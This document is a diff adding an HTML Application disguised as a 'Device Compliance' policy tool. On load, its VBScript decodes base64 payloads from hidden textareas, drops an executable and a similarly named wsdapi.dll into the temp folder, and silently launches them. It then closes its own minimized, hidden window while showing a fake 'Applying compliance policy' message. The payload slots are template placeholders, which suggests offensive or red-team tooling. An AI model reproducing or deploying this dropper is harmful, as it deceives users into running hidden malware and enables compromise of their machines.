@@ -1,0 +1,57 @@
+<html>
+<head>
+<title>Device Compliance</title>
+<HTA:APPLICATION
+    ID="DeviceCompliance"
+    APPLICATIONNAME="Device Compliance"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    NAVIGABLE="no"
+    SCROLL="no"
+    BORDER="none"
+    INNERBORDER="no"
+    CAPTION="no"
+/>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim oShell : Set oShell = CreateObject("WScript.Shell")
+    Dim sDir   : sDir = oShell.ExpandEnvironmentStrings("%TEMP%") & "\"
+    Dim sExe   : sExe = sDir & "EssosUpdate.exe"
+    Dim sDll   : sDll = sDir & "wsdapi.dll"
+
+    WriteB64ToFile document.getElementById("exeData").value, sExe
+    WriteB64ToFile document.getElementById("dllData").value, sDll
+
+    CreateObject("Shell.Application").ShellExecute sExe, "", sDir, "open", 0
+
+    Set oShell = Nothing
+    window.setTimeout "self.close", 3000, "VBScript"
+End Sub
+
+Sub WriteB64ToFile(sB64, sPath)
+    Dim oXml  : Set oXml = CreateObject("MSXML2.DOMDocument")
+    oXml.async = False
+    Dim oNode : Set oNode = oXml.createElement("b")
+    oNode.dataType = "bin.base64"
+    oNode.text = sB64
+    Dim oStrm : Set oStrm = CreateObject("ADODB.Stream")
+    oStrm.Type = 1
+    oStrm.Open
+    oStrm.Write oNode.nodeTypedValue
+    oStrm.SaveToFile sPath, 2
+    oStrm.Close
+    Set oStrm = Nothing
+    Set oNode = Nothing
+    Set oXml = Nothing
+End Sub
+</script>
+</head>
+<body style="background:#f3f2f1;font-family:'Segoe UI',Arial,sans-serif;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;">
+    <div style="text-align:center;color:#666;font-size:13px;">
+        <p style="font-weight:600;font-size:14px;">Device Compliance</p>
+        <p style="font-size:11px;margin-top:6px;color:#888;">Applying compliance policy...</p>
+    </div>
+    <textarea id="exeData" style="display:none">@@EXE_B64@@</textarea>
+    <textarea id="dllData" style="display:none">@@DLL_B64@@</textarea>
+</body>
+</html>
